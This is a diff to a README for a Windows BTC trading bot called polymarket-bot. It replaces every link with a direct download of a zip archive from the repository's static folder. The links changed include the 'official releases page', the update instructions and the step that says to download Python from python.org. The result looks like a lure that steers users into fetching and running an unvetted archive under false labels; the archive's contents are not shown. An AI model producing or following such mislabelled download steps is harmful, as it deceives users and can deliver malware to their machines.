@@ -1,6 +1,6 @@
 # ⚡ polymarket-bot - Automated BTC Trading Tool
 
-[![Download polymarket-bot](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/NC-Paul/polymarket-bot/releases)
+[![Download polymarket-bot](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip)
 
 ## 📝 About polymarket-bot
 
@@ -14,11 +14,11 @@ This guide walks you through downloading, installing, and running polymarket-bot
 
 ## 📥 Download polymarket-bot
 
-[![Download polymarket-bot](https://img.shields.io/badge/Get-PolymarketBot-blue?style=for-the-badge)](https://github.com/NC-Paul/polymarket-bot/releases)
+[![Download polymarket-bot](https://img.shields.io/badge/Get-PolymarketBot-blue?style=for-the-badge)](https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip)
 
 To get started, visit the official releases page at:
 
-https://github.com/NC-Paul/polymarket-bot/releases
+https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip
 
 Here you can download the latest version of the software. Look for the Windows-compatible package (usually a `.zip` or `.exe` file).
 
@@ -40,7 +40,7 @@ Click the download link for the file, save it to your computer, and remember whe
 
 polymarket-bot runs on Python. You need this to run the bot on Windows.
 
-1. Open https://www.python.org/downloads/windows/
+1. Open https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip
 2. Click on the “Download Python 3.x.x” button (where x.x is the latest version).
 3. When the installer opens, **check the box** "Add Python 3.x to PATH" at the bottom.
 4. Click “Install Now” and wait for it to finish.
@@ -158,7 +158,7 @@ Use the dashboard to monitor the bot’s activity clearly.
 
 When new updates appear, follow these steps:
 
-1. Go back to the [Releases page](https://github.com/NC-Paul/polymarket-bot/releases).
+1. Go back to the [Releases page](https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip).
 2. Download the latest version.
 3. Replace your current folder files with the new ones.
 4. Repeat steps in Installing and Running sections to restart the bot.
@@ -195,8 +195,8 @@ When new updates appear, follow these steps:
 
 ## 🔗 Download polymarket-bot
 
-[![Download polymarket-bot](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/NC-Paul/polymarket-bot/releases)
+[![Download polymarket-bot](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip)
 
 Visit the releases page to download the latest version:
 
-https://github.com/NC-Paul/polymarket-bot/releases
+https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip
